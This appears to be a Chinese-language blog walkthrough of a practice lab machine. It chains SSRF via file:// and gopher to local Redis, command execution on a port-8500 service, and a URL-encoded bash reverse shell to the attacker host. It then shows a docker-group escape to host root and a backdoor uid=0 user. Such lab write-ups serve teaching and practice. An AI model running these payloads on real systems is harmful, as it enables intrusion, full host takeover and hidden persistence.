---
title: "靶机实操05：SSRF打Redis与Docker组逃逸"
date: 2025-04-05
categories: [实操,靶机]
tags: [SSRF,gopher,redis,docker逃逸,提权]
---

**环境**：靶机 10.10.1.166（YX-Monitor 资产监控平台），攻击机 Kali 10.10.1.186。

### **<span style="color:#3498db">信息收集与 SSRF 入口</span>**

nmap 扫出 22 和 80：

![mm](/assets/img/2025-06-23-15-28-45.png)

平台首页里有个"**连通性检测**"功能：输入一个 URL，服务器替你去请求并回显结果——这就是 **SSRF（服务端请求伪造）**：**服务器替我们访问"只有它才能访问"的地址**，包括服务器自己的本地（localhost）和内网。

先试读本地文件，`file://` 协议直接回显了整个 `/etc/passwd`，说明检测功能支持任意协议：

```text
check.php?url=file:///etc/passwd
```

![mm](/assets/img/2025-06-23-15-56-38.png)

### **<span style="color:#3498db">探测本机 Redis（gopher 协议）</span>**

读文件只是热身，目标是内网服务。直接请求本机 6379：

![mm](/assets/img/2025-06-23-19-46-14.png)

`Empty reply from server`——**Redis 说的不是 HTTP 协议**，你按 HTTP 请求它，它回不了话，只能干瞪眼。

这时就要用 **gopher 协议**：它可以把**任意原始字节流**发给目标端口（理解为"手工构造 TCP 数据包"也行），于是可以按 Redis 自己的协议格式跟它对话：

```text
gopher://localhost:6379/_info%0AQUIT%0A
```

`%0A` 是换行——把 `info` 和 `QUIT` 两条命令按 Redis 协议发过去。

这里踩了个坑：**不加 `QUIT` 会一直超时**——Redis 服务端不会主动断开连接，而 gopher 在等它断开，双方互等到超时。所以在末尾补一条 `QUIT`，让 Redis 主动断开，结果立刻回显：

![mm](/assets/img/2025-06-23-16-44-24.png)

拿到 Redis 版本 **7.0.15**。之后试了经典的"写文件拿 shell"（权限不足）和"主从复制 RCE"（7.0+ 版本限制严格），都没成功。

### **<span style="color:#3498db">从 /proc/net/tcp 找内网服务</span>**

换个思路：SSRF 既然能读文件，就读 `/proc/net/tcp`——**内核暴露的 TCP 连接表，里面是十六进制的端口列表**，等于把服务器监听的端口全交代了。除了 22、6379，还发现一个 **8500**。

试探一下 8500：

```text
localhost:8500/v1/exec?cmd=id
```

这个服务直接把命令输出回显出来了——白送的 RCE：

![mm](/assets/img/2025-06-23-19-47-35.png)

### **<span style="color:#3498db">反弹 shell</span>**

把命令换成反弹 shell（payload 在 URL 里要整体编码：空格 `%20`、`>` `%3E`、`&` `%26`、`/` `%2F`）：

```text
localhost:8500/v1/exec?cmd=bash%20-c%20%27bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.1.186%2F4444%200%3E%261%27
```

![mm](/assets/img/2025-06-23-19-53-00.png)

拿到 www-data 的 shell。

### **<span style="color:#3498db">Docker 组逃逸</span>**

提权老三样（SUID、sudo -l、capability）都没有，但 `id` 暴露了自己在 **docker 组**：

![mm](/assets/img/2025-06-23-20-15-34.png)

**在 docker 组里约等于 root**：dockerd 守护进程是以 root 权限运行的，组内用户可以直接和 `/var/run/docker.sock` 通信、免认证使用完整的 Docker 功能。于是起一个容器，**把宿主机整个根目录挂载进容器**，再 chroot 进去——容器里就是宿主机的文件系统，而容器内我们是 root：

```bash
docker run -it -v /:/mnt yx-probe /bin/bash
chroot /mnt
whoami
```

![mm](/assets/img/2025-06-23-20-24-31.png)

宿主机的 root 到手。最后往宿主机 `/etc/passwd` 里写入一个 uid=0 的后门用户留个口子：

![mm](/assets/img/2025-06-23-20-33-33.png)
